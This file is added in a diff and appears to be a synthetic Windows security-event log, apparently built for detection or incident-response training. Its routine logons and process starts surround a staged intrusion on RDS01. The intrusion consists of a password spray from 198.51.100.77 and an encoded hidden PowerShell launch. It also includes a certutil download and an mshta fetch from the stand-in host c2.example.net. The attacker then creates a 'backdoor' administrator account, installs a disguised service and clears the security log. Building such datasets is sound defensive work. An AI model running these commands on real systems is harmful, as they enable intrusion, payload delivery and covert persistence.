@@ -1,0 +1,117 @@
+{"TimeCreated": "2026-11-17T07:01:10Z", "EventID": 4688, "Computer": "WS-007", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T07:19:45Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.76", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T07:47:11Z", "EventID": 4688, "Computer": "WS-002", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T08:00:30Z", "EventID": 4688, "Computer": "WS-007", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T08:07:27Z", "EventID": 4624, "Computer": "WS-006", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.76", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T08:16:48Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.58", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T08:17:14Z", "EventID": 4688, "Computer": "WS-007", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T08:19:05Z", "EventID": 4688, "Computer": "WS-001", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T08:19:52Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.48", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T08:36:44Z", "EventID": 4688, "Computer": "WS-002", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T08:42:48Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.30", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T08:51:34Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.35", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T08:51:36Z", "EventID": 4624, "Computer": "WS-006", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.43", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T08:54:26Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.44", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T09:10:58Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.35", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T09:12:00Z", "EventID": 4625, "Computer": "WS-004", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.44", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T09:29:47Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.60", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T09:48:41Z", "EventID": 4624, "Computer": "RDS01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.56", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T09:53:30Z", "EventID": 4624, "Computer": "WS-003", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.13", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T09:56:20Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.36", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:02:22Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "alice", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:02:44Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "bob", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:03:06Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "carol", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:03:28Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "dave", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:03:50Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "erin", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:04:12Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "frank", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:04:34Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "grace", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:04:56Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "heidi", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:05:18Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "ivan", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:05:40Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "judy", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:06:02Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:07:04Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "alice", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:07:26Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "bob", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:07:48Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "carol", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:08:10Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "dave", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:08:32Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "erin", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:08:54Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "frank", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:09:16Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "grace", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:09:38Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "heidi", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:10:00Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "ivan", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:10:22Z", "EventID": 4625, "Computer": "RDS01", "EventData": {"TargetUserName": "judy", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:10:44Z", "EventID": 4624, "Computer": "RDS01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "198.51.100.77", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:14:18Z", "EventID": 4688, "Computer": "WS-006", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T10:14:59Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.52", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T10:18:18Z", "EventID": 4624, "Computer": "WS-005", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.64", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T10:21:05Z", "EventID": 4688, "Computer": "RDS01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:21:40Z", "EventID": 4688, "Computer": "RDS01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\certutil.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "certutil.exe -urlcache -split -f http://c2.example.net/p.bin C:\\Users\\Public\\p.exe", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:22:10Z", "EventID": 4688, "Computer": "RDS01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\mshta.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "mshta.exe http://c2.example.net/a.hta", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:23:00Z", "EventID": 4720, "Computer": "RDS01", "EventData": {"TargetUserName": "backdoor", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:23:15Z", "EventID": 4732, "Computer": "RDS01", "EventData": {"TargetUserName": "Administrators", "MemberName": "backdoor", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:24:00Z", "EventID": 7045, "Computer": "RDS01", "EventData": {"ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Users\\Public\\p.exe", "SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:31:00Z", "EventID": 1102, "Computer": "RDS01", "EventData": {"SubjectUserName": "svc_backup"}}
+{"TimeCreated": "2026-11-17T10:32:46Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.42", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T10:43:13Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.88", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T11:02:55Z", "EventID": 4688, "Computer": "WS-005", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T11:03:20Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.74", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T11:04:21Z", "EventID": 4624, "Computer": "WS-003", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.65", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T11:28:20Z", "EventID": 4688, "Computer": "WS-002", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T11:31:25Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.15", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T11:33:33Z", "EventID": 4688, "Computer": "WS-001", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T11:36:27Z", "EventID": 4624, "Computer": "WS-003", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.38", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T11:42:28Z", "EventID": 4624, "Computer": "WS-007", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.78", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T11:43:05Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.87", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T11:43:17Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.26", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T11:45:12Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.31", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T11:46:03Z", "EventID": 4688, "Computer": "WS-003", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T12:04:48Z", "EventID": 4624, "Computer": "WS-001", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.33", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T12:07:56Z", "EventID": 4688, "Computer": "WS-005", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T12:16:42Z", "EventID": 4688, "Computer": "WS-009", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T12:19:59Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.85", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T12:22:42Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.24", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T12:38:06Z", "EventID": 4688, "Computer": "WS-006", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T12:40:46Z", "EventID": 4688, "Computer": "WS-009", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T12:45:08Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.40", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T12:47:54Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.56", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T12:59:16Z", "EventID": 4688, "Computer": "WS-004", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T13:09:09Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.66", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T13:14:19Z", "EventID": 4688, "Computer": "WS-003", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T13:19:37Z", "EventID": 4688, "Computer": "WS-003", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T13:26:25Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.84", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T13:28:22Z", "EventID": 4624, "Computer": "WS-001", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.45", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T13:35:07Z", "EventID": 4624, "Computer": "WS-003", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.79", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T13:40:00Z", "EventID": 4625, "Computer": "WS-004", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.44", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T14:09:21Z", "EventID": 4688, "Computer": "WS-004", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T14:12:21Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.20", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T14:17:39Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.76", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T14:21:04Z", "EventID": 4624, "Computer": "WS-006", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.35", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T14:36:18Z", "EventID": 4688, "Computer": "WS-010", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T14:39:26Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.78", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T15:04:08Z", "EventID": 4624, "Computer": "WS-006", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.74", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T15:06:57Z", "EventID": 4688, "Computer": "WS-005", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T15:08:29Z", "EventID": 4624, "Computer": "WS-006", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.20", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T15:15:38Z", "EventID": 4688, "Computer": "WS-006", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe --type=renderer", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T15:21:50Z", "EventID": 4688, "Computer": "WS-003", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T15:37:10Z", "EventID": 4624, "Computer": "WS-010", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.25", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T15:37:53Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.72", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T15:43:42Z", "EventID": 4624, "Computer": "RDS01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.20", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T15:44:43Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.20", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:02:00Z", "EventID": 4625, "Computer": "WS-004", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.44", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:12:18Z", "EventID": 4688, "Computer": "WS-009", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
+{"TimeCreated": "2026-11-17T16:14:33Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.13", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:15:02Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "dave", "IpAddress": "10.0.2.74", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:19:25Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.45", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T16:31:29Z", "EventID": 4624, "Computer": "WS-005", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.35", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T16:31:48Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.66", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:36:50Z", "EventID": 4624, "Computer": "WS-005", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.21", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T16:46:07Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.88", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T16:59:16Z", "EventID": 4624, "Computer": "WS-009", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.12", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T17:06:41Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "alice", "IpAddress": "10.0.2.81", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T17:23:14Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.51", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T17:45:19Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.28", "LogonType": "10"}}
+{"TimeCreated": "2026-11-17T17:50:50Z", "EventID": 4624, "Computer": "WS-008", "EventData": {"TargetUserName": "frank", "IpAddress": "10.0.2.54", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T18:04:42Z", "EventID": 4624, "Computer": "WS-001", "EventData": {"TargetUserName": "bob", "IpAddress": "10.0.2.32", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T18:32:56Z", "EventID": 4624, "Computer": "WS-005", "EventData": {"TargetUserName": "carol", "IpAddress": "10.0.2.87", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T18:35:09Z", "EventID": 4624, "Computer": "WS-004", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.34", "LogonType": "2"}}
+{"TimeCreated": "2026-11-17T18:49:37Z", "EventID": 4624, "Computer": "WS-002", "EventData": {"TargetUserName": "erin", "IpAddress": "10.0.2.27", "LogonType": "3"}}
+{"TimeCreated": "2026-11-17T18:50:05Z", "EventID": 4688, "Computer": "WS-008", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "C:\\Windows\\explorer.exe"}}
